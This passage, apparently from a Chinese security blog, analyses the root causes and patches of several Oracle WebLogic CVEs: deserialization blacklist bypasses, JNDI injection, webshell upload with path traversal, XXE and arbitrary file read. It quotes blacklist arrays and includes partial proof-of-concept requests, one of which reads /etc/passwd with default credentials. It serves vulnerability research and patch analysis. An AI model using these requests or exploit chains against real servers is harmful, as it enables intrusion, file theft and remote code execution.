<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><h4 id="第一个绕过"><a href="#第一个绕过" class="headerlink" title="第一个绕过"></a>第一个绕过</h4><p>依旧使用的是动态代理类来绕过T3协议反序列化的黑名单。在CVE-2017-3248中，代理的接口Registry被封禁，而这次，使用了Activator作为代理的接口，绕过了ServerChannelInputStream的resolveProxyClass方法的拦截。它的InvocationHandler实现为RemoteObjectInvocationHandler，该类处理远程对象的调用，反序列化代理类时，会先反序列化RemoteObjectInvocationHandler，但是它并没有实现readObject方法，而它的父类RemoteObject实现了，在RemoteObject的readObject方法中，会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。在JDK6下，无法使用CC链，而在JDK7u21下，可以配合CC链造成RCE。</p>
<h4 id="第二个绕过"><a href="#第二个绕过" class="headerlink" title="第二个绕过"></a>第二个绕过</h4><p>使用StreamMessageImpl进行二次反序列化，与CVE-2016-0638相同。</p>
<p>之前使用的JDK6的CC链进行命令执行，而在安装CVE-2017-3248的补丁后，commons-collections.jar包升级了版本导致CC链无法使用，由于WebLogic自带commons-fileupload.jar包，所以改用org.apache.commons.fileupload.disk.DiskFileItem类，配合JDK6空字符截断的特性，写入WebShell。而在安装CVE-2017-3248的补丁后，JDK7的CC链依旧可以使用。</p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>这里我使用了WebLogic12.1.3的环境和JDK7u21，WebLogic12.1.3使用OPatch安装补丁。</p>
<p>需要在&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;middleware&#x2F;OPatch下新建了一个PATCH_TOP目录，然后将补丁zip丢进去。</p>
<p>解压，cd进入补丁目录，输入命令<code>/u01/app/oracle/middleware/OPatch/opatch apply</code>。</p>
<p>报如下错误：</p>
<p><img src="C:\Users\77478\AppData\Roaming\Typora\typora-user-images\image-20230509200053647.png" alt="image-20230509200053647"></p>
<p><code>su oracle</code>后进apply就行了。</p>
<p>查看补丁信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\u01\app\oracle\middleware\OPatch\opatch lsinventory</span><br><span class="line">或者</span><br><span class="line">E:\Oracle\Middleware12214\OPatch\opatch lsinventory -jdk %JAVA_HOME%</span><br></pre></td></tr></table></figure>

<p>WeblogicFilterConfig.class中的黑名单多了个UnicastRef，很迷惑的修复。</p>
<p>对于第一个绕过来说，因为反序列化时反序列化的是代理类，然后再反序列化其他类，在反序列化其他类时并不会检测是否在黑名单，所以依旧能攻击成功。</p>
<p>对于第二个绕过来说，StreamMessageImpl并不在黑名单，导致第二个绕过仍然可以使用。</p>
<p>所以说修了等于没修。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, </span><br><span class="line">    <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, </span><br><span class="line">    <span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>利用StreamMessageImpl造成二次反序列化，第二次反序列化动态代理对象，动态代理对象的InvocationHandler实现为RemoteObjectInvocationHandler，当反序列化该类时会发起JRMP连接，然后伪造JRMP服务端返回一个恶意对象，这个恶意对象使用的是yso的JDK7u21包装的LinkedHashSet，适用于JDK版本小于7u21的环境，当反序列化这个恶意对象（LinkedHashSet）时，造成RCE。</p>
<p>LinkedHashSet反序列化过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>使用原生JDK7u21的利用链造成RCE。</p>
<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = &#123; <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;java.rmi.activation&quot;</span>, <span class="string">&quot;sun.rmi.server&quot;</span> &#125;;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = &#123; <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>, <span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>在两处uri<code>/ws_utc/begin.do</code>，<code>/ws_utc/config.do</code>处存在未授权文件上传漏洞。</p>
<p>第一处<code>/ws_utc/config.do</code>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101120075.png" alt="image-20230510111515012"></p>
<p>第二处<code>/ws_utc/begin.do</code>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101122259.png" alt="image-20230510112206096"></p>
<h4 id="x2F-ws-utc-x2F-config-do"><a href="#x2F-ws-utc-x2F-config-do" class="headerlink" title="&#x2F;ws_utc&#x2F;config.do"></a>&#x2F;ws_utc&#x2F;config.do</h4><p>上传文件，然后抓包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101139779.png" alt="image-20230510113940713"></p>
<p>实际访问的URI为&#x2F;ws_utc&#x2F;resources&#x2F;setting&#x2F;keystore，由SettingResource的editKeyStoreSettingByMultiPart方法处理：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101612216.png" alt="image-20230510161234164"></p>
<p>进入isRequstedByAdmin方法查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101612751.png" alt="image-20230510161259687"></p>
<p>isRequstedByAdmin方法判断是否是开发模式。所以走else分支：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101614080.png" alt="image-20230510161456021"></p>
<p>else分支中获取时间戳，然后调用convertFormDataMultiPart方法，如下，传递四个参数，第一个为表单参数、第二个为附件标志位、第三个为存储keyStore文件的路径、第四个为当前时间戳：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101615350.png" alt="image-20230510161553307"></p>
<p>getKeyStorePath方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101616269.png" alt="image-20230510161654170"></p>
<p>获取的路径为tmp&#x2F;WSTestPageWorkDir&#x2F;config&#x2F;keystore，然后进入convertFormDataMultiPart方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101618652.png" alt="image-20230510161852572"></p>
<p>设置存储路径为方法的第三个参数path，同时将filename赋值给临时变量attachName。接着往下看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101619318.png" alt="image-20230510161945253"></p>
<p>将storePath作为路径、然后使用下划线将fileNamePrefix和attachName拼接，获取完整文件路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/tmp/WSTestPageWorkDir/config/keystore/1683706480629_shell.jsp</span><br></pre></td></tr></table></figure>

<p>fileNamePrefix就是方法传递的第四个参数-时间戳：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101624205.png" alt="image-20230510162408142"></p>
<p>拼接完之后获取绝对路径，调用saveAttachedFile保存文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101627742.png" alt="image-20230510162742700"></p>
<h4 id="x2F-ws-utc-x2F-begin-do"><a href="#x2F-ws-utc-x2F-begin-do" class="headerlink" title="&#x2F;ws_utc&#x2F;begin.do"></a>&#x2F;ws_utc&#x2F;begin.do</h4><p>点击上传文件，然后抓包：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101144596.png" alt="image-20230510114402503"></p>
<p>实际访问的URI为<code>/ws_utc/resources/ws/config/import</code>，由WebserviceResource的importWsTestConfig方法处理该路由。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101149540.png" alt="image-20230510114920451"></p>
<p>调用convertFormDataMultiPart方法，convertFormDataMultiPart方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101157476.png" alt="image-20230510115714405"></p>
<p>接着调用重载的convertFormDataMultiPart方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101209263.png" alt="image-20230510120924174"></p>
<p>fdcd对应如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;import_file_name&quot;; filename=&quot;shell.jsp&quot;</span><br></pre></td></tr></table></figure>

<p>接下来如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101217152.png" alt="image-20230510121745082"></p>
<p>按&#x2F;RS_Upload_时间戳&#x2F;文件前缀_文件名的格式将输入流存储到磁盘上的文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101550021.png" alt="image-20230510155031978"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101606680.png" alt="image-20230510160613636"></p>
<p>虽然文件能上传成功，但是最后在ImportTestCaseAction的execute方法会调用XML解析器解析该文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101559162.png" alt="image-20230510155942092"></p>
<p>由于我们上传的是jsp文件，XML解析器无法解析就会抛异常；</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101600694.png" alt="image-20230510160013642"></p>
<p>导致返回状态码为500。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101605749.png" alt="image-20230510160506696"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101601860.png" alt="image-20230510160155770"></p>
<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>&#x2F;ws_utc&#x2F;config.do将文件保存在了工作目录的&#x2F;config&#x2F;keystore下，同时文件名的格式为：时间戳_自定义文件名的格式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/config/keystore/1683706480629_shell.jsp</span><br></pre></td></tr></table></figure>

<p>&#x2F;ws_utc&#x2F;begin.do将文件保存在了工作目录的&#x2F;upload下（没有则创建），然后会自动生成一层子目录，格式为RS_Upload_时间戳，然后使用_作为分隔符将import_file_name字符串和自定义文件名进行拼接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/RS_Upload_2023-05-10_08-01-42_446/import_file_name_shell.jsp</span><br></pre></td></tr></table></figure>

<p>由于路径标准化不严格且使用getAbsolutePath获取最终的绝对路径：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101636094.png" alt="image-20230510163628013"></p>
<p>所以可以使用&#x2F;..&#x2F;进行目录穿越。</p>
<p>在config.do下还可以设置工作目录：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101638123.png" alt="image-20230510163839066"></p>
<p>默认的工作目录为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/tmp/WSTestPageWorkDir</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>分类：JNDI注入；</p>
<p>T3反序列化漏洞，这次同样是找的绕过黑名单的类，使用的是JtaTransactionManager类，该类在&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;middleware&#x2F;wlserver&#x2F;modules&#x2F;com.bea.core.repackaged.springframework.spring_1.5.0.0_2-5-3.jar中，反序列化入口点如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101808793.png" alt="image-20230510180823674"></p>
<p>进入initUserTransactionAndTransactionManager方法查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101809936.png" alt="image-20230510180921866"></p>
<p>若userTransaction为null，则判断userTransactionName是否有值，有值的话调用lookupUserTransaction方法，同时将userTransactionName传递。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101811826.png" alt="image-20230510181124750"></p>
<p>发起JNDI连接，使用可控的userTransactionName作为URL。造成JNDI注入。</p>
<h2 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>该漏洞是对CVE-2018-2893补丁的绕过，补丁封禁了RemoteObjectInvocationHandler，由于反序列化造成JRMP连接的是RemoteObject，所以只需要寻找RemoteObject的子类即可，且该子类未实现readObject方法。</p>
<p>该CVE-2018-3245使用的是RMIConnectionImpl_Stub，该类的继承图如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101832025.png" alt="image-20230510183206970"></p>
<p>RMIConnectionImpl_Stub的父类RemoteStub也未实现readObject，所以反序列化就交给了RemoteObject，在RemoteObject反序列化时发起JRMP连接，配合JDK7u21链实现RCE。</p>
<h2 id="CVE-2018-3246"><a href="#CVE-2018-3246" class="headerlink" title="CVE-2018-3246"></a>CVE-2018-3246</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>该漏洞基于CVE-2018-2894的一个上传文件点：&#x2F;ws_utc&#x2F;begin.do，由于JDK6和JDK7默认会解析外部实体，所以可以通过上传XML文件，导致外部实体注入。</p>
<p>之前说过该URI会将文件保存到磁盘上，然后再使用SAXUnmarshaller解析该文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305101559162.png" alt="image-20230510155942092"></p>
<p>后续来到RegistryXMLReader的parse，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305102322383.png" alt="image-20230510232234274"></p>
<p>设置ContentHandler、ErrorHandler、DTDHandler。</p>
<p>ContentHandler负责处理文档的开始结束事件、XML元素的开始结束事件、可忽略的实体事件、名称空间前缀映射开始和结束事件、指令事件、字符数据和可忽略的空格事件。</p>
<p>ErrorHandler处理XML文档解析时产生的错误。</p>
<p>DTDHandler处理对文档DTD进行解析时产生的相应事件。</p>
<p>并没有使用XMLDecoder将XML元素转换成java实例，所以无法通过XML内容直接RCE。</p>
<h2 id="CVE-2018-3252"><a href="#CVE-2018-3252" class="headerlink" title="CVE-2018-3252"></a>CVE-2018-3252</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>漏洞POC如下（源自pyn3rd）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">wl_request_type: data_transfer_request</span><br><span class="line">username: weblogic</span><br><span class="line">password: weblogic</span><br><span class="line">serverName: pyn3rd</span><br><span class="line">deployment_request_id: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36 QQBrowser/4.1.4132.400</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3334</span><br><span class="line"></span><br><span class="line">JDK7u21链的恶意对象字节码</span><br></pre></td></tr></table></figure>

<p>找到处理该URI的Servlet为DeploymentServiceServlet，先经过doPost方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305110001209.png" alt="image-20230511000129080"></p>
<p>调用authenticateRequest方法进行认证，然后调用internalDoPost方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305110003679.png" alt="image-20230511000328612"></p>
<p>获取请求头信息，根据类别分别进入不同的处理方法。这里进入handleDataTransferRequest方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305110005928.png" alt="image-20230511000536814"></p>
<p>在handleDataTransferRequest方法中，创建了一个DeploymentObjectInputStream对象，同时通过req.getInputStream方法将请求体作为输入流，供DeploymentObjectInputStream反序列化。</p>
<p>DeploymentObjectInputStream的继承关系如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305110007377.png" alt="image-20230511000732363"></p>
<p>DeploymentObjectInputStream和父类WLObjectInputStream未作任何安全检查，也未使用黑名单过滤。</p>
<p>所以使用URI：&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService，同时控制请求头wl_request_type为 data_transfer_request，那么他就会反序列化请求体的内容，请求体的内容设置为JDK7u21链恶意对象的字节码即可完成RCE。</p>
<h2 id="CVE-2019-2615"><a href="#CVE-2019-2615" class="headerlink" title="CVE-2019-2615"></a>CVE-2019-2615</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成任意文件读取，POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET http://localhost:7001/bea_wls_management_internal2/wl_management</span><br><span class="line">adminPath: /etc/passwd</span><br><span class="line">username: weblogic</span><br><span class="line">password: qaxateam01</span><br><span class="line">wl_request_type: wl_jsp_refresh_request</span><br></pre></td></tr></table></figure>

<p>URI为&#x2F;bea_wls_management_internal2&#x2F;wl_management，找到Servlet为FileDistributionServlet：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111230985.png" alt="image-20230511123008759"></p>
<p>由doGet方法处理GET请求：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111332545.png" alt="image-20230511133235448"></p>
<p>判断用户身份，然后获取wl_request_type请求头的值，然后根据不同的值进行不同的处理，当值为wl_jsp_refresh_request时，进入doGetJspRefreshRequest方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111334550.png" alt="image-20230511133434476"></p>
<p>将请求头adminPath的值作为文件路径，然后读取文件内容，输出到响应体中，造成任意文件读取。</p>
<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>补丁代码直接删除了requestType的“wl_jsp_refresh_request”参数的判断，同时也删除了doGetJspRefreshRequest()方法。</p>
<h2 id="CVE-2019-2618"><a href="#CVE-2019-2618" class="headerlink" title="CVE-2019-2618"></a>CVE-2019-2618</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>与CVE-2018-3252的URI相同，都是&#x2F;bea_wls_deployment_internal&#x2F;DeploymentService，只不过这次请求头wl_request_type不为data_transfer_request，而是app_upload。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111341110.png" alt="image-20230511134118035"></p>
<p>进入handlePlanOrApplicationUpload方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111425093.png" alt="image-20230511142529955"></p>
<p>然后进入doUploadFile方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111426449.png" alt="image-20230511142610326"></p>
<p>这里使用commons-fileupload库解析请求，上传文件。</p>
<h2 id="分割线-1"><a href="#分割线-1" class="headerlink" title="分割线"></a>分割线</h2><p>以下CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、CVE-2019-2888均为T3协议反序列化漏洞造成的XXE，他们分别使用到了绕过黑名的类ForeignRecoveryContext、WsrmServerPayloadContext、UnknownMsgHeader、WsrmSequenceContext、EJBTaglibDescriptor。而且都是调用readExternal作为入口点。</p>
<h2 id="CVE-2019-2647"><a href="#CVE-2019-2647" class="headerlink" title="CVE-2019-2647"></a>CVE-2019-2647</h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>T3协议反序列化漏洞造成XXE。</p>
<p>位于ForeignRecoveryContext的readExternal方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111709796.png" alt="image-20230511170949640"></p>
<p>进入readFrom方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111712176.png" alt="image-20230511171231113"></p>
<p>调用readEndpointReference方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111713548.png" alt="image-20230511171340486"></p>
<p>未设置外部实体保护，反序列化XML内容造成XXE。</p>
<h2 id="CVE-2019-2648"><a href="#CVE-2019-2648" class="headerlink" title="CVE-2019-2648"></a>CVE-2019-2648</h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>T3反序列化造成XXE。</p>
<p>这次位于WsrmServerPayloadContext的readExternal方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111718497.png" alt="image-20230511171808431"></p>
<p>这里的size是XML内容的字节大小，接着调用readEndpt方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111723417.png" alt="image-20230511172345310"></p>
<p>先创建一个字节数组，然后读取输入流中的XML内容，然后调用DocumentBuilder解析XML，未开启外部实体保护，造成XXE。</p>
<h2 id="CVE-2019-2649"><a href="#CVE-2019-2649" class="headerlink" title="CVE-2019-2649"></a>CVE-2019-2649</h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>T3协议造成XXE。</p>
<p>这次发生在UnknownMsgHeader的readExternal方法中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111729404.png" alt="image-20230511172938315"></p>
<p>输入流读取一个size，然后根据这个size创建一个字节数组，然后从输入流中将XML内容读取到这个字节数组，然后将这个字节数组b包装成字节输入流stream，然后调用DocumentBuilder解析该XML字节输入流，未开启外部实体保护，造成XXE。</p>
<h2 id="CVE-2019-2650"><a href="#CVE-2019-2650" class="headerlink" title="CVE-2019-2650"></a>CVE-2019-2650</h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>T3协议反序列化造成XXE。</p>
<p>这次发生在WsrmSequenceContext的readExternal中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111732883.png" alt="image-20230511173258799"></p>
<p>然后调用readEndpt方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111734009.png" alt="image-20230511173434688"></p>
<p>同样，也是从流中读取XML内容，然后在未开启实体保护的情况下解析XML内容造成XXE。</p>
<h2 id="CVE-2019-2888"><a href="#CVE-2019-2888" class="headerlink" title="CVE-2019-2888"></a>CVE-2019-2888</h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>T3协议反序列化造成XXE。</p>
<p>这次发生在EJBTaglibDescriptor的readExternal方法中：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111738992.png" alt="image-20230511173812156"></p>
<p>先读取XML内容，然后调用load方法，将XML内容传入，load方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305111739385.png" alt="image-20230511173922326"></p>
<p>这里也是在未开启外部实体保护的情况下使用DocumentBuilder解析XML内容造成XXE。</p>
<h2 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>利用XMLDecoder反序列化，同时XML标签绕过了CVE-2017-10271的补丁限制，然后反序列化成功UnitOfWorkChangeSet类，在该类的构造函数中调用了readObject方法将第一个方法参数进行读取，造成二次反序列化漏洞。</p>
<p>POC如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">string</span>&gt;</span>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</span><br><span class="line">                  <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">void</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;byte&quot;</span> <span class="attr">length</span>=<span class="string">&quot;8970&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">byte</span>&gt;</span>-84<span class="tag">&lt;/<span class="name">byte</span>&gt;</span></span><br><span class="line">              		  ...</span><br><span class="line">              		  ...</span><br><span class="line">          			  <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">				  <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>CVE-2017-10271使用的URI为&#x2F;wls-wsat&#x2F;CoordinatorPortType，而这次的URI为&#x2F;_async&#x2F;AsyncResponseService，同时由于URI不同，导致处理的入口点不同，CVE-2017-10271，入口点为WorkContextServerTube#processRequest，而该CVE-2019-2725为BaseWSServlet#service。</p>
<p>调用链如下：</p>
